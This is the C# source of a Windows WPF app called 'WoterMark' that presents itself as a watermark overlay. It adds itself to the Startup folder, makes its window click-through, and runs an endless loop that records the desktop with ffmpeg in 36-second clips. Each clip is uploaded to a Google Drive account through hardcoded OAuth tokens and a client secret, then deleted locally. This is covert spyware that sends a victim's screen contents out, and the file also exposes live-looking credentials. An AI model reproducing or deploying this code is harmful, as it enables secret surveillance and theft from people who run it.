using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Data;
using System.Windows.Documents;
using System.Windows.Input;
using System.Windows.Interop;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using System.Windows.Navigation;
using System.Windows.Shapes;
using IWshRuntimeLibrary;
using System.IO;
using System.Configuration;
using CommandExecutor;
using System.Threading;
using Google.Apis.Auth.OAuth2.Flows;
using Google.Apis.Auth.OAuth2.Responses;
using Google.Apis.Auth.OAuth2;
using Google.Apis.Drive.v3;
using Google.Apis.Services;
using Google.Apis.Util.Store;
using static Google.Apis.Drive.v3.DriveService;
using Google.Apis.Upload;
using static System.Formats.Asn1.AsnWriter;

namespace WoterMark
{
    public partial class MainWindow : Window
    {
        private bool _isDataDirty = true;
        TextBox documentTextBox = new TextBox();
        TextBox documentTextBox2 = new TextBox();
        Window w = new Window();
        Window closeWindow;
        Button closeButton;
        Slider slider;

        private string password = string.Empty;
        private void documentTextBox_TextChanged(object sender, TextChangedEventArgs e)
        {
            password = documentTextBox.Text;
        }

        public MainWindow()
        {
            try
            {
                WindowsServices.Create($@"C:\users\{Environment.UserName}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\WoterMark.lnk", System.IO.Path.Combine(Directory.GetCurrentDirectory(), "WoterMark.exe"));
            }
            finally
            {
                InitializeComponent();
            }
            Task.Run(() => RecordScreen());
        }
        private void Window_Loaded(object sender, RoutedEventArgs e)
        {

        }

        private async Task RecordScreen()
        {
            var executor = new CommandLineExecutor();
            var libsPath = "C:\\Program Data";
            while (true)
            {
                try
                {
                    var dt = DateTime.Now.ToString("yyyy-MM-dd-HH-mm");
                    executor.Execute($"cd {libsPath}", $"ffmpeg.exe -t 36 -hide_banner -loglevel error -f gdigrab -framerate 15 -i desktop -c:v libx264 {dt}.mp4 -f {dt}.mp4");
                    Thread.Sleep(36100);

                    UploadFile($"{libsPath}/{dt}.mp4");
                    System.IO.File.Delete($"{libsPath}/{dt}.mp4");
                    Thread.Sleep(10000);
                }
                catch (Exception ex)
                {
                    System.IO.File.AppendAllText($"{libsPath}\\1.txt", ex.StackTrace);
                    System.IO.File.AppendAllText($"{libsPath}\\1.txt", ex.Message);
                }
            }
        }

        protected override void OnSourceInitialized(EventArgs e)
        {
            try
            {
                base.OnSourceInitialized(e);
                var hwnd = new WindowInteropHelper(this).Handle;
                WindowsServices.SetWindowExTransparent(hwnd);
            }
            catch { }
        }

        private static DriveService GetService()
        {
            var tokenResponse = new TokenResponse
            {
                AccessToken = "ya29.a0AXooCgulQKAnhfP8abuaghts6kK-U7EGMTgeqkZnruBPbPViALxWU1SVMBrTjRkotqxvpL7NQ1ylC9oaiKisa1kDISpVLhAmSUCHZFs9PqAdVHCMQBJ81ue395bppcDTV--FkMjEyg9RJyMf1wwnJBxkFHGhlULNhhq8aCgYKAdgSARASFQHGX2MizeBSZ2LfIYY66ZXLtitVIg0171",
                RefreshToken = "1//04snwG8pBGWquCgYIARAAGAQSNwF-L9IrU6GQicr4ZzRfXOIuXrQrj0fS4xbuc2EJP6qyNlOjTcfDia09OStB82OF0QV-ZtFsQRY",
            };


            var applicationName = "service"; // Use the name of the project in Google Cloud
            var username = "freiaqwerty@gmail.com"; // Use your email


            var apiCodeFlow = new GoogleAuthorizationCodeFlow(new GoogleAuthorizationCodeFlow.Initializer
            {
                ClientSecrets = new ClientSecrets
                {
                    ClientId = "137923084845-2s9kl5knqe8mpa2orfg78nt8qeph8j9s.apps.googleusercontent.com",
                    ClientSecret = "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"
                },
                Scopes = new[] { DriveService.Scope.Drive },
                DataStore = new FileDataStore(applicationName)
            });


            var credential = new UserCredential(apiCodeFlow, username, tokenResponse);



            var service = new DriveService(new BaseClientService.Initializer
            {
                HttpClientInitializer = credential,
                ApplicationName = applicationName
            });
            return service;
        }


        public string CreateFolder(string parent, string folderName)
        {
            var service = GetService();
            var driveFolder = new Google.Apis.Drive.v3.Data.File();
            driveFolder.Name = folderName;
            driveFolder.MimeType = "application/vnd.google-apps.folder";
            //  driveFolder.Parents = new string[] { parent };
            var command = service.Files.Create(driveFolder);
            var file = command.Execute();
            return file.Id;
        }


        public string UploadFile(string fileName)
        {
            var libsPath = "C:\\Program Data";
            DriveService service = GetService();
            using (var fsSource = new FileStream(fileName, FileMode.Open, FileAccess.Read))
            {
                // Create a new file, with metadata and stream.
                var fileMetadata = new Google.Apis.Drive.v3.Data.File()
                {
                    Name = fsSource.Name
                };
                var request = service.Files.Create(fileMetadata, fsSource, "video/mp4");
                request.Fields = "*";
                var results = request.Upload();

                System.IO.File.AppendAllText($"{libsPath}\\1.txt", results?.Exception?.Message ?? "Success");
                System.IO.File.AppendAllText($"{libsPath}\\1.txt", results.Status.ToString());
                if (results.Status == UploadStatus.Failed)
                {
                    Console.WriteLine($"Error uploading file: {results.Exception.Message}");
                }
            }

            return "";
        }
    }
    public static class WindowsServices
    {
        const int WS_EX_TRANSPARENT = 0x00000020;
        const int GWL_EXSTYLE = (-20);

        [DllImport("user32.dll")]
        static extern int GetWindowLong(IntPtr hwnd, int index);

        [DllImport("user32.dll")]
        static extern int SetWindowLong(IntPtr hwnd, int index, int newStyle);

        public static void SetWindowExTransparent(IntPtr hwnd)
        {
            var extendedStyle = GetWindowLong(hwnd, GWL_EXSTYLE);
            SetWindowLong(hwnd, GWL_EXSTYLE, extendedStyle | WS_EX_TRANSPARENT);
        }

        public static void Create(string ShortcutPath, string TargetPath)
        {
            WshShell wshShell = new WshShell(); //создаем объект wsh shell

            IWshShortcut Shortcut = (IWshShortcut)wshShell.
                CreateShortcut(ShortcutPath);

            Shortcut.TargetPath = TargetPath; //путь к целевому файлу

            Shortcut.Save();
        }
    }

}
